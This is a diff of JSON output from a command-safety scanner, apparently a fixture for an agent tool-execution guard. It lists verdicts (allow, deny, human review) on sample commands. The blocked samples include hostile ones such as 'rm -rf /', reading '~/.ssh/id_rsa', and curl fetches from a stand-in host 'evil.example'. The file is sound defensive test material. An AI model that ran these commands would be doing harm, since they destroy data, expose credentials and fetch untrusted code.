@@ -1,26 +1,330 @@
-{
-  "decision": "deny",
-  "risk_level": "high",
-  "rule_id": "network.non_whitelisted_domain",
-  "evidence": [
-    "domain \"evil.example\" is not in network_allowlist"
-  ],
-  "recommendation": "Use a whitelisted domain or update network_allowlist after review.",
-  "tool_name": "workspace_exec",
-  "command": "curl https://evil.example/install.sh",
-  "backend": "workspaceexec",
-  "blocked": true,
-  "redacted": false,
-  "duration_ms": 0,
-  "findings": [
-    {
-      "decision": "deny",
-      "risk_level": "high",
-      "rule_id": "network.non_whitelisted_domain",
-      "evidence": [
-        "domain \"evil.example\" is not in network_allowlist"
-      ],
-      "recommendation": "Use a whitelisted domain or update network_allowlist after review."
-    }
-  ]
-}
+[
+  {
+    "decision": "allow",
+    "risk_level": "low",
+    "recommendation": "Command matched no high-risk safety rules.",
+    "tool_name": "workspace_exec",
+    "command": "go test ./...",
+    "backend": "workspaceexec",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "workspaceexec scan allowed command \"go test ./...\"; no high-risk network, path, shell, resource, dependency, or secret patterns matched."
+  },
+  {
+    "decision": "deny",
+    "risk_level": "critical",
+    "rule_id": "dangerous.rm_rf",
+    "evidence": [
+      "rm -rf /"
+    ],
+    "recommendation": "Do not run recursive forced deletion through tool execution.",
+    "tool_name": "workspace_exec",
+    "command": "rm -rf /",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "decision": "deny",
+        "risk_level": "medium",
+        "rule_id": "policy.command_not_allowed",
+        "evidence": [
+          "command \"rm\" is not in allowed_commands"
+        ],
+        "recommendation": "Use an allowed command or update allowed_commands in the policy."
+      },
+      {
+        "decision": "deny",
+        "risk_level": "critical",
+        "rule_id": "dangerous.rm_rf",
+        "evidence": [
+          "rm -rf /"
+        ],
+        "recommendation": "Do not run recursive forced deletion through tool execution."
+      }
+    ]
+  },
+  {
+    "decision": "deny",
+    "risk_level": "critical",
+    "rule_id": "sensitive.path_access",
+    "evidence": [
+      "argument references denied path \"~/.ssh/id_rsa\""
+    ],
+    "recommendation": "Do not access SSH keys, .env files, credential stores, or system directories from tool execution.",
+    "tool_name": "workspace_exec",
+    "command": "cat ~/.ssh/id_rsa",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "decision": "deny",
+        "risk_level": "critical",
+        "rule_id": "sensitive.path_access",
+        "evidence": [
+          "argument references denied path \"~/.ssh/id_rsa\""
+        ],
+        "recommendation": "Do not access SSH keys, .env files, credential stores, or system directories from tool execution."
+      }
+    ]
+  },
+  {
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "network.non_whitelisted_domain",
+    "evidence": [
+      "domain \"evil.example\" is not in network_allowlist"
+    ],
+    "recommendation": "Use a whitelisted domain or update network_allowlist after review.",
+    "tool_name": "workspace_exec",
+    "command": "curl https://evil.example/install.sh",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "decision": "deny",
+        "risk_level": "high",
+        "rule_id": "network.non_whitelisted_domain",
+        "evidence": [
+          "domain \"evil.example\" is not in network_allowlist"
+        ],
+        "recommendation": "Use a whitelisted domain or update network_allowlist after review."
+      }
+    ]
+  },
+  {
+    "decision": "allow",
+    "risk_level": "low",
+    "recommendation": "Command matched no high-risk safety rules.",
+    "tool_name": "workspace_exec",
+    "command": "curl https://api.github.com/repos/trpc-group/trpc-agent-go",
+    "backend": "workspaceexec",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "workspaceexec scan allowed command \"curl https://api.github.com/repos/trpc-group/trpc-agent-go\"; no high-risk network, path, shell, resource, dependency, or secret patterns matched."
+  },
+  {
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "shell.bypass",
+    "evidence": [
+      "command contains shell bypass syntax or wrapper"
+    ],
+    "recommendation": "Avoid sh -c, bash -c, eval, backticks, $(), variable expansion, redirections, and process substitutions in tool commands.",
+    "tool_name": "workspace_exec",
+    "command": "bash -c 'curl https://evil.example/x'",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "decision": "deny",
+        "risk_level": "high",
+        "rule_id": "shell.bypass",
+        "evidence": [
+          "command contains shell bypass syntax or wrapper"
+        ],
+        "recommendation": "Avoid sh -c, bash -c, eval, backticks, $(), variable expansion, redirections, and process substitutions in tool commands."
+      },
+      {
+        "decision": "deny",
+        "risk_level": "high",
+        "rule_id": "network.non_whitelisted_domain",
+        "evidence": [
+          "domain \"evil.example\" is not in network_allowlist"
+        ],
+        "recommendation": "Use a whitelisted domain or update network_allowlist after review."
+      },
+      {
+        "decision": "deny",
+        "risk_level": "medium",
+        "rule_id": "policy.command_not_allowed",
+        "evidence": [
+          "command \"bash\" is not in allowed_commands"
+        ],
+        "recommendation": "Use an allowed command or update allowed_commands in the policy."
+      }
+    ]
+  },
+  {
+    "decision": "needs_human_review",
+    "risk_level": "medium",
+    "rule_id": "shell.pipeline_review",
+    "evidence": [
+      "command contains a shell pipeline or command chain"
+    ],
+    "recommendation": "Review multi-stage shell commands manually or replace them with a small audited script.",
+    "tool_name": "workspace_exec",
+    "command": "cat README.md | wc -l",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "rule_id": "shell.pipeline_review",
+        "evidence": [
+          "command contains a shell pipeline or command chain"
+        ],
+        "recommendation": "Review multi-stage shell commands manually or replace them with a small audited script."
+      }
+    ]
+  },
+  {
+    "decision": "needs_human_review",
+    "risk_level": "medium",
+    "rule_id": "dependency.environment_change",
+    "evidence": [
+      "command starts with \"npm install\""
+    ],
+    "recommendation": "Dependency installation or environment mutation should be reviewed and pinned before execution.",
+    "tool_name": "workspace_exec",
+    "command": "npm install left-pad",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "rule_id": "dependency.environment_change",
+        "evidence": [
+          "command starts with \"npm install\""
+        ],
+        "recommendation": "Dependency installation or environment mutation should be reviewed and pinned before execution."
+      }
+    ]
+  },
+  {
+    "decision": "needs_human_review",
+    "risk_level": "medium",
+    "rule_id": "resource.long_sleep",
+    "evidence": [
+      "command contains a long sleep"
+    ],
+    "recommendation": "Use a shorter sleep or a bounded wait condition.",
+    "tool_name": "workspace_exec",
+    "command": "sleep 9999",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "rule_id": "resource.long_sleep",
+        "evidence": [
+          "command contains a long sleep"
+        ],
+        "recommendation": "Use a shorter sleep or a bounded wait condition."
+      }
+    ]
+  },
+  {
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "resource.large_output",
+    "evidence": [
+      "command appears to generate output above the policy limit"
+    ],
+    "recommendation": "Limit output size, write bounded artifacts, or raise the policy limit after review.",
+    "tool_name": "workspace_exec",
+    "command": "yes x | head -c 9999999",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "rule_id": "shell.pipeline_review",
+        "evidence": [
+          "command contains a shell pipeline or command chain"
+        ],
+        "recommendation": "Review multi-stage shell commands manually or replace them with a small audited script."
+      },
+      {
+        "decision": "deny",
+        "risk_level": "high",
+        "rule_id": "resource.large_output",
+        "evidence": [
+          "command appears to generate output above the policy limit"
+        ],
+        "recommendation": "Limit output size, write bounded artifacts, or raise the policy limit after review."
+      }
+    ]
+  },
+  {
+    "decision": "needs_human_review",
+    "risk_level": "high",
+    "rule_id": "hostexec.long_session",
+    "evidence": [
+      "hostexec requested background or PTY execution"
+    ],
+    "recommendation": "Require human approval for host PTY/background sessions and ensure timeout, process-group cleanup, and output caps are enforced.",
+    "tool_name": "exec_command",
+    "command": "tail -f app.log",
+    "backend": "hostexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "decision": "needs_human_review",
+        "risk_level": "high",
+        "rule_id": "hostexec.long_session",
+        "evidence": [
+          "hostexec requested background or PTY execution"
+        ],
+        "recommendation": "Require human approval for host PTY/background sessions and ensure timeout, process-group cleanup, and output caps are enforced."
+      },
+      {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "rule_id": "process.background",
+        "evidence": [
+          "command may leave a background process behind"
+        ],
+        "recommendation": "Run foreground commands with a bounded timeout, or record the session id and cleanup plan."
+      }
+    ]
+  },
+  {
+    "decision": "needs_human_review",
+    "risk_level": "medium",
+    "rule_id": "codeexec.host_command_bridge",
+    "evidence": [
+      "python code can launch shell commands"
+    ],
+    "recommendation": "Review code that bridges from code execution into shell execution.",
+    "tool_name": "execute_code",
+    "backend": "codeexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "findings": [
+      {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "rule_id": "codeexec.host_command_bridge",
+        "evidence": [
+          "python code can launch shell commands"
+        ],
+        "recommendation": "Review code that bridges from code execution into shell execution."
+      }
+    ]
+  }
+]
